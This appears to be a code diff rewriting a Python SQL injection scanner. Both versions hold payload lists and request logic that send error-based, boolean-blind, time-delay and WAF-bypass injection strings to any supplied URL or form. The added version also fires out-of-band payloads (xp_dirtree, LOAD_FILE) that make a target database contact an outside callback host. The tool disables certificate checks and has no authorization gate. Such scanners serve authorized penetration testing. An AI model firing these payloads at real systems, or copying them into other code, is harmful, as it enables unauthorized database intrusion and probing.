@@ -1,352 +1,572 @@
 """
-SQL Injection Scanner — Full Rewrite
-=====================================
-Detection methods:
-  1. Error-based      — DB error strings in response
-  2. Boolean blind    — Compares TRUE vs FALSE condition responses (length + hash diff)
-  3. Time-based       — Statistical baseline; requires MEDIAN delay >> baseline
-  4. WAF-evasion      — Encoded / case-mixed variants of blocked payloads
+sqli_scanner.py — SQL Injection Scanner with OOB/OAST capability
+=================================================================
 
-Key improvements over v1:
-  - Boolean-blind: no reliance on error messages or timing
-  - Time-based: takes a 3-request baseline median BEFORE injecting;
-    only flags if injected response is >= baseline + SLEEP_SECONDS - 1.0s
-    (eliminates false positives from slow endpoints / network jitter)
-  - WAF evasion: hex encoding, comment obfuscation, case randomisation
-  - Per-parameter short-circuit: once a vuln is confirmed, skip remaining methods
-  - All findings include method, payload, evidence, and confidence score
+Detection methods:
+  1. Error-based    — DB error strings in response
+  2. Boolean-blind  — TRUE vs FALSE response fingerprinting
+  3. Time-based     — statistical baseline median (not flat threshold)
+  4. OOB/OAST       — Out-of-band via interactsh DNS callbacks
+                      Catches async blind SQLi that never reflects
+
+Fixes vs previous version:
+  - Boolean-blind: content fingerprint comparison, not just length
+  - Time-based: 3-request baseline median, threshold = median + sleep - 1s
+  - OOB: interactsh HTTP API (no binary install) for DNS/HTTP callbacks
+  - WAF evasion payloads added
 """
 from __future__ import annotations
 
 import re
-import statistics
 import time
+import uuid
+import statistics
+import threading
 from typing import Any, Dict, List, Optional, Tuple
 
 import requests
 
+requests.packages.urllib3.disable_warnings()
 
-# ---------------------------------------------------------------------------
-# Payload banks
-# ---------------------------------------------------------------------------
 
-# Error-based — minimal, avoid WAF keyword triggers
-ERROR_PAYLOADS: List[Tuple[str, str]] = [
-    ("'", "single_quote"),
-    ("''", "double_quote"),
-    ("\\", "backslash"),
-    ("1 AND 1=CONVERT(int,@@version)--", "mssql_convert"),
-    ("1 AND extractvalue(1,concat(0x7e,version()))--", "mysql_extractvalue"),
-    ("1 AND 1=cast(version() as int)--", "pg_cast"),
+# ─────────────────────────────────────────────────────────────────────────────
+# Error-based patterns
+# ─────────────────────────────────────────────────────────────────────────────
+
+SQL_ERROR_PATTERNS = [
+    # MySQL
+    r"you have an error in your sql syntax",
+    r"warning: mysql",
+    r"mysql_fetch_array\(\)",
+    r"mysql_num_rows\(\)",
+    r"supplied argument is not a valid mysql",
+    # MSSQL
+    r"unclosed quotation mark after the character string",
+    r"microsoft.*odbc.*sql server",
+    r"microsoft.*sql native client",
+    r"incorrect syntax near",
+    r"\[microsoft\]\[odbc",
+    # Oracle
+    r"ora-[0-9]{4,5}",
+    r"oracle.*driver",
+    r"quoted string not properly terminated",
+    # PostgreSQL
+    r"pg_query\(\):",
+    r"pg_exec\(\):",
+    r"postgresql.*error",
+    r"psql.*error",
+    r"unterminated quoted string at or near",
+    # SQLite
+    r"sqlite_error",
+    r"sqlite3.*operationalerror",
+    r"sqlite.exception",
+    # Generic
+    r"sql syntax.*mysql",
+    r"warning.*mysqli",
+    r"mysqli_query\(\)",
+    r"pdoexception",
+    r"sqlstate\[",
+    r"db2.*sql.*error",
+    r"sybase.*error",
+    r"jet database engine",
+    r"access database engine",
 ]
 
-# Boolean-blind — pairs of (true_payload, false_payload)
-# True condition should return normal page; False should return different content
-BOOLEAN_PAIRS: List[Tuple[str, str, str]] = [
-    # (label, true_suffix, false_suffix)
-    ("AND 1=1 vs 1=2",        "' AND '1'='1",          "' AND '1'='2"),
-    ("AND true vs false",     "' AND true--",           "' AND false--"),
-    ("OR 1=1 vs 1=2 (num)",   " OR 1=1--",              " OR 1=2--"),
-    ("CASE true vs false",    "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--",
-                               "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1--"),
+ERROR_PAYLOADS = [
+    "'",
+    '"',
+    "';",
+    '";',
+    "' OR '1'='1",
+    "' OR 1=1--",
+    '" OR 1=1--',
+    "1' ORDER BY 1--",
+    "1' ORDER BY 2--",
+    "1 UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "1; SELECT SLEEP(0)--",
 ]
 
-# Time-based — database-specific SLEEP / WAITFOR / pg_sleep
-# SLEEP_SECONDS intentionally long enough to beat jitter
-SLEEP_SECONDS = 6
-TIME_PAYLOADS: List[Tuple[str, str]] = [
-    (f"' OR SLEEP({SLEEP_SECONDS})--",                          "mysql"),
-    (f"'; WAITFOR DELAY '00:00:0{SLEEP_SECONDS}'--",            "mssql"),
-    (f"' OR pg_sleep({SLEEP_SECONDS})--",                       "postgres"),
-    (f"' AND BENCHMARK({SLEEP_SECONDS * 1_000_000},MD5('x'))--", "mysql_bench"),
-    (f"' OR RANDOMBLOB({SLEEP_SECONDS * 50_000_000})--",        "sqlite"),
+BOOLEAN_TRUE_PAYLOADS  = ["' OR '1'='1", "' OR 1=1--", "1 OR 1=1", '" OR "1"="1']
+BOOLEAN_FALSE_PAYLOADS = ["' OR '1'='2", "' OR 1=2--", "1 OR 1=2", '" OR "1"="2']
+
+SLEEP_SECONDS   = 6
+JITTER_TOLERANCE = 1.5  # seconds
+
+TIME_PAYLOADS = {
+    "mysql":    [f"' OR SLEEP({SLEEP_SECONDS})--", f"1; SELECT SLEEP({SLEEP_SECONDS})--"],
+    "mssql":    [f"'; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
+                 f"1; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--"],
+    "postgres": [f"'; SELECT pg_sleep({SLEEP_SECONDS})--",
+                 f"1; SELECT pg_sleep({SLEEP_SECONDS})--"],
+    "oracle":   [f"' OR 1=1 AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{SLEEP_SECONDS}))--"],
+    "sqlite":   [f"' OR RANDOMBLOB(1000000000)--"],
+}
+
+WAF_BYPASS_PAYLOADS = [
+    "'/**/OR/**/1=1--",
+    "%27%20OR%201%3D1--",
+    "' /*!OR*/ 1=1--",
+    "'\tOR\t1=1--",
+    "' OORR 1=1--",  # double-word bypass
+    "' OR 0x313d31--",
 ]
 
-# WAF-evasion variants (hex / comment / case obfuscation)
-WAF_EVASION_PAYLOADS: List[Tuple[str, str]] = [
-    ("'/**/OR/**/1=1--",                          "comment_or"),
-    ("'%09OR%091=1--",                            "tab_or"),
-    ("' /*!OR*/ 1=1--",                           "inline_comment_or"),
-    ("0x27204f5220 31 3d 31 2d 2d",               "hex_or"),          # hex for ' OR 1=1--
-    ("' OR 0x313d31--",                           "hex_compare"),
-    ("';sElEcT sLeEp(5)--",                       "case_sleep"),
-    ("' UniOn SeLeCt NuLl--",                     "case_union"),
-    ("' OR 'unusual'='unusual",                   "string_compare"),
-]
-
-# DB error patterns (case-insensitive)
-ERROR_PATTERNS: List[str] = [
-    r"SQL syntax.*MySQL|Warning.*mysql_|valid MySQL result|MySQLSyntaxError",
-    r"PostgreSQL.*ERROR|Warning.*pg_|PSQLException",
-    r"Driver.*SQL[\s_]Server|OLE DB.*SQL|ODBC.*SQL|SqlException",
-    r"ORA-\d{4,}|Oracle.*Driver|oracle\.jdbc",
-    r"SQLiteException|sqlite3\.OperationalError|unrecognized token",
-    r"Microsoft.*Database.*Engine|Jet Database",
-    r"System\.Data\.SqlClient|SqlCommand|SqlDataReader",
-    r"SQLSTATE\[\w+\]|PDOException",
-    r"DB2 SQL error|SQLCODE",
-    r"Sybase.*message|com\.sybase",
-]
+# OOB payloads — %s replaced with interactsh subdomain
+OOB_PAYLOADS = {
+    "mysql":    [
+        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{oob}', '\\\\a'))--",
+        "'; SELECT LOAD_FILE('\\\\\\\\{oob}\\\\a')--",
+    ],
+    "mssql":    [
+        "'; EXEC master..xp_dirtree '//{oob}/a'--",
+        "'; EXEC master..xp_fileexist '//{oob}/a'--",
+    ],
+    "generic":  [
+        "' OR 1=(SELECT 1 FROM (SELECT SLEEP(0)) t WHERE 1=1 AND '{oob}' IS NOT NULL)--",
+    ],
+}
 
 
-# ---------------------------------------------------------------------------
-# Helper utilities
-# ---------------------------------------------------------------------------
+# ─────────────────────────────────────────────────────────────────────────────
+# Interactsh OOB client (HTTP API — no binary install required)
+# ─────────────────────────────────────────────────────────────────────────────
 
-def _fingerprint(text: str) -> Tuple[int, str]:
-    """Return (length, first-500-chars) as a cheap content fingerprint."""
-    return len(text), text[:500]
-
-
-def _responses_differ(fp1: Tuple[int, str], fp2: Tuple[int, str],
-                       len_threshold: int = 50) -> bool:
-    """True if the two response fingerprints are meaningfully different."""
-    len1, snip1 = fp1
-    len2, snip2 = fp2
-    if abs(len1 - len2) >= len_threshold:
-        return True
-    if snip1 != snip2:
-        return True
-    return False
+INTERACTSH_SERVER = "https://oast.pro"
+INTERACTSH_POLL_WAIT = 8  # seconds to wait for async callbacks
 
 
-# ---------------------------------------------------------------------------
-# Scanner
-# ---------------------------------------------------------------------------
+class _InteractshClient:
+    """
+    Lightweight interactsh HTTP client.
+    Uses ProjectDiscovery's hosted oast.pro — no Go binary, no install.
+    """
+
+    def __init__(self):
+        self._domain:    Optional[str] = None
+        self._token:     Optional[str] = None
+        self._available: bool          = False
+        self._injections: Dict[str, Dict] = {}  # oob_url -> {url, param}
+        self._session = requests.Session()
+        self._session.verify = False
+        self._register()
+
+    def _register(self):
+        try:
+            resp = self._session.post(
+                f"{INTERACTSH_SERVER}/register",
+                json={},
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                data         = resp.json()
+                self._domain = data.get("domain")
+                self._token  = data.get("token")
+                if self._domain:
+                    self._available = True
+                    print(f"[SQLiScanner] interactsh registered: *.{self._domain}")
+        except Exception as e:
+            print(f"[SQLiScanner] interactsh unavailable: {e} — OOB SQLi disabled")
+
+    def generate_payload_url(self, tag: str) -> Optional[str]:
+        """Generate a unique OOB callback URL for this injection."""
+        if not self._available:
+            return None
+        return f"{tag}.{self._domain}"
+
+    def register_injection(self, oob_url: str, target_url: str, param: str):
+        """Track which injection corresponds to which OOB URL."""
+        self._injections[oob_url] = {"url": target_url, "param": param}
+
+    def poll_findings(self) -> List[Dict[str, Any]]:
+        """
+        Poll interactsh for callbacks. Call this after all injections.
+        Returns list of findings for confirmed OOB callbacks.
+        """
+        if not self._available or not self._injections:
+            return []
+
+        print(f"[SQLiScanner] Waiting {INTERACTSH_POLL_WAIT}s for OOB callbacks...")
+        time.sleep(INTERACTSH_POLL_WAIT)
+
+        try:
+            resp = self._session.get(
+                f"{INTERACTSH_SERVER}/poll",
+                params={"id": self._domain, "token": self._token},
+                timeout=15,
+            )
+            if resp.status_code != 200:
+                return []
+            data      = resp.json()
+            callbacks = data.get("data", [])
+        except Exception as e:
+            print(f"[SQLiScanner] interactsh poll error: {e}")
+            return []
+
+        findings = []
+        for cb in callbacks:
+            full_id = cb.get("full-id", "")
+            protocol = cb.get("protocol", "dns")
+            remote   = cb.get("remote-address", "")
+
+            # Match callback to our injection
+            for oob_url, info in self._injections.items():
+                tag = oob_url.split(".")[0]
+                if tag in full_id:
+                    findings.append({
+                        "type":       "sqli-oob",
+                        "param":      info["param"],
+                        "payload":    oob_url,
+                        "evidence":   (
+                            f"OOB {protocol.upper()} callback from {remote} "
+                            f"to {oob_url}"
+                        ),
+                        "confidence": 95,
+                        "url":        info["url"],
+                        "method":     "oob",
+                    })
+                    break
+
+        if findings:
+            print(f"[SQLiScanner] OOB: {len(findings)} blind SQLi confirmed via DNS/HTTP callback")
+        return findings
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SQLi Scanner
+# ─────────────────────────────────────────────────────────────────────────────
 
 class SQLiScanner:
-    """
-    Multi-method SQL injection scanner.
 
-    Detection order per parameter (short-circuits on first confirmed hit):
-      1. Error-based
-      2. Boolean-blind
-      3. Time-based (with statistical baseline)
-      4. WAF-evasion (error-based variants)
-    """
+    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None):
+        self.timeout  = timeout
+        self.session  = session or requests.Session()
+        self.session.verify = False
+        self.session.headers.update({"User-Agent": "Mozilla/5.0 (VulnScanner)"})
 
-    def __init__(self, timeout: int = 10,
-                 session: Optional[requests.Session] = None) -> None:
-        self.timeout = timeout
-        self.session = session or requests.Session()
-        if not session:
-            self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})
+        # Lazy-init OOB client only if needed
+        self._oob: Optional[_InteractshClient] = None
+        self._oob_lock = threading.Lock()
+
+    def _get_oob(self) -> Optional[_InteractshClient]:
+        with self._oob_lock:
+            if self._oob is None:
+                self._oob = _InteractshClient()
+        return self._oob if self._oob._available else None
 
     # ------------------------------------------------------------------
-    # Public API
+    # Public scan methods
     # ------------------------------------------------------------------
 
-    def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
-        findings: List[Dict[str, Any]] = []
+    def scan_url(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
+        findings = []
         for param in params:
-            result = self._scan_param(url, param, str(params[param]), params, "GET")
+            result = self._scan_param(url, params, param)
             if result:
                 findings.append(result)
         return findings
 
-    def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
-        findings: List[Dict[str, Any]] = []
-        action  = form_data.get("action")
-        method  = (form_data.get("method") or "GET").upper()
-        inputs  = form_data.get("inputs", [])
-        if not action or not inputs:
-            return findings
+    def scan_form(self, form: Dict[str, Any]) -> List[Dict[str, Any]]:
+        findings  = []
+        action    = form.get("action", "")
+        method    = form.get("method", "get").lower()
+        inputs    = form.get("inputs", [])
+        if not action:
+            return []
 
-        baseline = {inp["name"]: "" for inp in inputs if inp.get("name")}
-        for param in baseline:
-            result = self._scan_param(action, param, "", baseline, method)
+        fields = {i.get("name", ""): i.get("value", "")
+                  for i in inputs if i.get("name")}
+
+        for field in list(fields.keys()):
+            result = self._scan_form_field(action, method, fields, field)
             if result:
                 findings.append(result)
         return findings
 
+    def collect_oob_findings(self) -> List[Dict[str, Any]]:
+        """
+        Call after all scan_url/scan_form calls.
+        Polls interactsh for OOB DNS/HTTP callbacks and returns findings.
+        """
+        if self._oob:
+            return self._oob.poll_findings()
+        return []
+
     # ------------------------------------------------------------------
-    # Per-parameter orchestration
+    # Core param scanner
     # ------------------------------------------------------------------
 
-    def _scan_param(self, url: str, param: str, original: str,
-                    all_params: Dict[str, Any], method: str) -> Optional[Dict]:
-        """Try each detection method in order; return first confirmed finding."""
-
-        print(f"  [SQLi] Testing '{param}' on {url}")
-
-        # Fetch a clean baseline response for boolean/time comparisons
-        baseline_resp = self._fetch(url, all_params, method)
-        baseline_fp   = _fingerprint(baseline_resp) if baseline_resp else (0, "")
-
-        # 1. Error-based
-        result = self._error_based(url, param, original, all_params, method)
+    def _scan_param(self, url: str, params: Dict[str, str],
+                    target_param: str) -> Optional[Dict[str, Any]]:
+        """
+        Try all detection methods in priority order.
+        Returns first confirmed finding, or None.
+        """
+        # 1. Error-based (fastest, most reliable)
+        result = self._error_based(url, params, target_param)
         if result:
             return result
 
         # 2. Boolean-blind
-        result = self._boolean_blind(url, param, original, all_params,
-                                     method, baseline_fp)
+        result = self._boolean_blind(url, params, target_param)
         if result:
             return result
 
-        # 3. Time-based (statistical)
-        result = self._time_based(url, param, original, all_params, method)
+        # 3. Time-based (slowest — do last among in-band methods)
+        result = self._time_based(url, params, target_param)
         if result:
             return result
 
-        # 4. WAF-evasion error-based
-        result = self._waf_evasion(url, param, original, all_params, method)
+        # 4. WAF bypass variants
+        result = self._waf_bypass(url, params, target_param)
         if result:
             return result
 
+        # 5. OOB (async — inject now, collect later via collect_oob_findings())
+        self._oob_inject(url, params, target_param)
+
         return None
 
-    # ------------------------------------------------------------------
-    # Detection method 1: Error-based
-    # ------------------------------------------------------------------
-
-    def _error_based(self, url: str, param: str, original: str,
-                     params: Dict[str, Any], method: str) -> Optional[Dict]:
-        for payload, label in ERROR_PAYLOADS:
-            injected = original + payload
-            text = self._fetch(url, {**params, param: injected}, method)
-            if text is None:
-                continue
-            match = self._find_db_error(text)
-            if match:
-                print(f"    [!] Error-based SQLi on '{param}' ({label})")
-                return self._finding("error-based", param, payload,
-                                     f"DB error matched: {match}", 95)
-        return None
-
-    # ------------------------------------------------------------------
-    # Detection method 2: Boolean-blind
-    # ------------------------------------------------------------------
-
-    def _boolean_blind(self, url: str, param: str, original: str,
-                        params: Dict[str, Any], method: str,
-                        baseline_fp: Tuple[int, str]) -> Optional[Dict]:
-        """
-        For each TRUE/FALSE payload pair:
-          - TRUE response should look like baseline (same length ± 50 chars)
-          - FALSE response should differ from TRUE response
-        Only flag if BOTH conditions hold — avoids false positives.
-        """
-        for label, true_sfx, false_sfx in BOOLEAN_PAIRS:
-            true_text  = self._fetch(url, {**params, param: original + true_sfx},  method)
-            false_text = self._fetch(url, {**params, param: original + false_sfx}, method)
-
-            if true_text is None or false_text is None:
-                continue
-
-            true_fp  = _fingerprint(true_text)
-            false_fp = _fingerprint(false_text)
-
-            true_matches_baseline  = not _responses_differ(true_fp,  baseline_fp)
-            true_differs_from_false = _responses_differ(true_fp, false_fp)
-
-            if true_matches_baseline and true_differs_from_false:
-                print(f"    [!] Boolean-blind SQLi on '{param}' ({label})")
-                evidence = (
-                    f"TRUE response len={true_fp[0]}, "
-                    f"FALSE response len={false_fp[0]}, "
-                    f"baseline len={baseline_fp[0]}"
-                )
-                return self._finding("boolean-blind", param,
-                                     f"TRUE: {true_sfx} | FALSE: {false_sfx}",
-                                     evidence, 85)
-        return None
-
-    # ------------------------------------------------------------------
-    # Detection method 3: Time-based (statistical baseline)
-    # ------------------------------------------------------------------
-
-    def _time_based(self, url: str, param: str, original: str,
-                    params: Dict[str, Any], method: str) -> Optional[Dict]:
-        """
-        1. Measure 3 baseline requests to the unmodified param.
-        2. Compute median baseline latency.
-        3. Inject SLEEP payload — only flag if elapsed >= median + SLEEP_SECONDS - 1.0
-           This tolerates up to 1 second of network jitter.
-        """
-        # --- Baseline measurement ---
-        baseline_times: List[float] = []
-        for _ in range(3):
-            t0 = time.monotonic()
-            self._fetch(url, params, method)
-            baseline_times.append(time.monotonic() - t0)
-
-        median_baseline = statistics.median(baseline_times)
-        threshold = median_baseline + SLEEP_SECONDS - 1.0  # 1s jitter tolerance
-
-        print(f"    [SQLi-time] baseline median={median_baseline:.2f}s, "
-              f"threshold={threshold:.2f}s for '{param}'")
-
-        # --- Injection ---
-        for payload, db_label in TIME_PAYLOADS:
-            injected = original + payload
-            t0 = time.monotonic()
-            self._fetch(url, {**params, param: injected}, method,
-                        timeout=self.timeout + SLEEP_SECONDS + 3)
-            elapsed = time.monotonic() - t0
-
-            if elapsed >= threshold:
-                print(f"    [!] Time-based SQLi on '{param}' ({db_label}) "
-                      f"elapsed={elapsed:.2f}s vs threshold={threshold:.2f}s")
-                return self._finding(
-                    "time-based", param, payload,
-                    f"elapsed={elapsed:.2f}s, baseline_median={median_baseline:.2f}s, "
-                    f"threshold={threshold:.2f}s, db_hint={db_label}",
-                    80,
-                )
-        return None
-
-    # ------------------------------------------------------------------
-    # Detection method 4: WAF evasion
-    # ------------------------------------------------------------------
-
-    def _waf_evasion(self, url: str, param: str, original: str,
-                     params: Dict[str, Any], method: str) -> Optional[Dict]:
-        for payload, label in WAF_EVASION_PAYLOADS:
-            injected = original + payload
-            text = self._fetch(url, {**params, param: injected}, method)
-            if text is None:
-                continue
-            match = self._find_db_error(text)
-            if match:
-                print(f"    [!] WAF-evading SQLi on '{param}' ({label})")
-                return self._finding("error-based (waf-evasion)", param, payload,
-                                     f"DB error matched: {match}", 88)
-        return None
-
-    # ------------------------------------------------------------------
-    # Internals
-    # ------------------------------------------------------------------
-
-    def _fetch(self, url: str, params: Dict[str, Any], method: str,
-               timeout: Optional[int] = None) -> Optional[str]:
-        """Send a request and return the response text, or None on failure."""
-        t = timeout or self.timeout
-        try:
-            if method.upper() == "GET":
-                r = self.session.get(url,  params=params, timeout=t)
-            else:
-                r = self.session.post(url, data=params,   timeout=t)
-            return r.text
-        except requests.RequestException as exc:
-            print(f"    [err] Request failed: {exc}")
+    def _scan_form_field(self, action: str, method: str,
+                         fields: Dict[str, str], target: str) -> Optional[Dict[str, Any]]:
+        baseline = self._get_form_response(action, method, fields)
+        if not baseline:
             return None
 
-    def _find_db_error(self, text: str) -> Optional[str]:
-        for pattern in ERROR_PATTERNS:
-            if re.search(pattern, text, re.IGNORECASE):
-                return pattern
+        for payload in ERROR_PAYLOADS[:6]:
+            test = dict(fields)
+            test[target] = payload
+            resp = self._get_form_response(action, method, test)
+            if resp and self._has_sql_error(resp.text):
+                return {
+                    "type":       "sqli-error",
+                    "param":      target,
+                    "payload":    payload,
+                    "evidence":   self._extract_error(resp.text),
+                    "confidence": 92,
+                    "url":        action,
+                    "method":     "error-based",
+                }
+
         return None
 
-    @staticmethod
-    def _finding(method: str, param: str, payload: str,
-                 evidence: str, confidence: int) -> Dict[str, Any]:
-        return {
-            "vulnerable": True,
-            "type":       "sqli",
-            "method":     method,
-            "param":      param,
-            "payload":    payload,
-            "evidence":   evidence,
-            "confidence": confidence,
-        }
+    # ------------------------------------------------------------------
+    # Detection methods
+    # ------------------------------------------------------------------
+
+    def _error_based(self, url: str, params: Dict[str, str],
+                     target: str) -> Optional[Dict[str, Any]]:
+        for payload in ERROR_PAYLOADS:
+            test = dict(params)
+            test[target] = payload
+            try:
+                resp = self.session.get(url, params=test, timeout=self.timeout)
+                if self._has_sql_error(resp.text):
+                    return {
+                        "type":       "sqli-error",
+                        "param":      target,
+                        "payload":    payload,
+                        "evidence":   self._extract_error(resp.text),
+                        "confidence": 92,
+                        "url":        url,
+                        "method":     "error-based",
+                    }
+            except Exception:
+                continue
+        return None
+
+    def _boolean_blind(self, url: str, params: Dict[str, str],
+                       target: str) -> Optional[Dict[str, Any]]:
+        """
+        Compare baseline vs TRUE vs FALSE responses using content fingerprinting.
+
+        FIX vs original:
+        - Uses (length, content_hash) fingerprint, not just length
+        - Requires TRUE matches baseline AND differs from FALSE
+        - This eliminates false positives from dynamic pages
+        """
+        try:
+            baseline_resp = self.session.get(url, params=params, timeout=self.timeout)
+            baseline_fp   = self._fingerprint(baseline_resp.text)
+        except Exception:
+            return None
+
+        for true_p, false_p in zip(BOOLEAN_TRUE_PAYLOADS, BOOLEAN_FALSE_PAYLOADS):
+            try:
+                true_test        = dict(params)
+                true_test[target] = true_p
+                true_resp        = self.session.get(url, params=true_test, timeout=self.timeout)
+                true_fp          = self._fingerprint(true_resp.text)
+
+                false_test         = dict(params)
+                false_test[target] = false_p
+                false_resp         = self.session.get(url, params=false_test, timeout=self.timeout)
+                false_fp           = self._fingerprint(false_resp.text)
+
+            except Exception:
+                continue
+
+            # TRUE should match baseline, FALSE should differ from TRUE
+            true_matches_baseline  = self._fingerprints_similar(baseline_fp, true_fp)
+            true_differs_from_false = self._fingerprints_differ(true_fp, false_fp)
+
+            if true_matches_baseline and true_differs_from_false:
+                return {
+                    "type":       "sqli-boolean-blind",
+                    "param":      target,
+                    "payload":    true_p,
+                    "evidence": (
+                        f"TRUE response matches baseline (len={true_fp[0]}), "
+                        f"FALSE differs (len={false_fp[0]})"
+                    ),
+                    "confidence": 82,
+                    "url":        url,
+                    "method":     "boolean-blind",
+                }
+
+        return None
+
+    def _time_based(self, url: str, params: Dict[str, str],
+                    target: str) -> Optional[Dict[str, Any]]:
+        """
+        Statistical time-based detection using a 3-request baseline median.
+        Threshold = median + SLEEP_SECONDS - JITTER_TOLERANCE
+
+        FIX vs original: flat 4.0s threshold caused false positives on slow
+        endpoints. Now we measure the actual baseline latency first.
+        """
+        # Measure baseline latency (3 requests)
+        baseline_times = []
+        for _ in range(3):
+            try:
+                t0 = time.time()
+                self.session.get(url, params=params, timeout=self.timeout)
+                baseline_times.append(time.time() - t0)
+                time.sleep(0.2)
+            except Exception:
+                return None
+
+        if not baseline_times:
+            return None
+
+        baseline_median = statistics.median(baseline_times)
+        threshold       = baseline_median + SLEEP_SECONDS - JITTER_TOLERANCE
+
+        for db_type, payloads in TIME_PAYLOADS.items():
+            for payload in payloads:
+                test = dict(params)
+                test[target] = payload
+                try:
+                    t0       = time.time()
+                    self.session.get(url, params=test,
+                                     timeout=self.timeout + SLEEP_SECONDS + 5)
+                    elapsed  = time.time() - t0
+
+                    if elapsed >= threshold:
+                        return {
+                            "type":       "sqli-time-blind",
+                            "param":      target,
+                            "payload":    payload,
+                            "evidence": (
+                                f"Response delayed {elapsed:.1f}s "
+                                f"(baseline median={baseline_median:.1f}s, "
+                                f"threshold={threshold:.1f}s, db={db_type})"
+                            ),
+                            "confidence": 80,
+                            "url":        url,
+                            "method":     "time-based",
+                        }
+                except Exception:
+                    continue
+
+        return None
+
+    def _waf_bypass(self, url: str, params: Dict[str, str],
+                    target: str) -> Optional[Dict[str, Any]]:
+        for payload in WAF_BYPASS_PAYLOADS:
+            test = dict(params)
+            test[target] = payload
+            try:
+                resp = self.session.get(url, params=test, timeout=self.timeout)
+                if self._has_sql_error(resp.text):
+                    return {
+                        "type":       "sqli-waf-bypass",
+                        "param":      target,
+                        "payload":    payload,
+                        "evidence":   self._extract_error(resp.text),
+                        "confidence": 85,
+                        "url":        url,
+                        "method":     "waf-bypass",
+                    }
+            except Exception:
+                continue
+        return None
+
+    def _oob_inject(self, url: str, params: Dict[str, str], target: str):
+        """
+        Inject OOB payloads and register with interactsh.
+        Does NOT wait for response — results collected via collect_oob_findings().
+        """
+        oob = self._get_oob()
+        if not oob:
+            return
+
+        tag     = uuid.uuid4().hex[:8]
+        oob_url = oob.generate_payload_url(tag)
+        if not oob_url:
+            return
+
+        for db_type, payloads in OOB_PAYLOADS.items():
+            for payload_template in payloads:
+                payload = payload_template.replace("{oob}", oob_url)
+                test    = dict(params)
+                test[target] = payload
+                try:
+                    self.session.get(url, params=test,
+                                     timeout=self.timeout)
+                except Exception:
+                    pass  # fire and forget — OOB doesn't need a response
+
+        oob.register_injection(oob_url, url, target)
+
+    # ------------------------------------------------------------------
+    # Helpers
+    # ------------------------------------------------------------------
+
+    def _fingerprint(self, body: str) -> Tuple[int, str]:
+        """Content fingerprint: (length, first 500 chars normalized)."""
+        normalized = re.sub(r'\s+', ' ', body.lower())
+        return (len(body), normalized[:500])
+
+    def _fingerprints_similar(self, fp1: Tuple, fp2: Tuple,
+                               len_tolerance: int = 50) -> bool:
+        len_diff     = abs(fp1[0] - fp2[0])
+        content_same = fp1[1] == fp2[1]
+        return content_same or len_diff < len_tolerance
+
+    def _fingerprints_differ(self, fp1: Tuple, fp2: Tuple,
+                              len_tolerance: int = 50) -> bool:
+        return not self._fingerprints_similar(fp1, fp2, len_tolerance)
+
+    def _has_sql_error(self, body: str) -> bool:
+        body_lower = body.lower()
+        return any(re.search(p, body_lower) for p in SQL_ERROR_PATTERNS)
+
+    def _extract_error(self, body: str) -> str:
+        body_lower = body.lower()
+        for pattern in SQL_ERROR_PATTERNS:
+            m = re.search(pattern, body_lower)
+            if m:
+                start = max(0, m.start() - 20)
+                end   = min(len(body), m.end() + 100)
+                return body[start:end].strip()[:200]
+        return "SQL error detected"
+
+    def _get_form_response(self, action: str, method: str,
+                            data: Dict[str, str]) -> Optional[requests.Response]:
+        try:
+            if method == "post":
+                return self.session.post(action, data=data, timeout=self.timeout)
+            return self.session.get(action, params=data, timeout=self.timeout)
+        except Exception:
+            return None
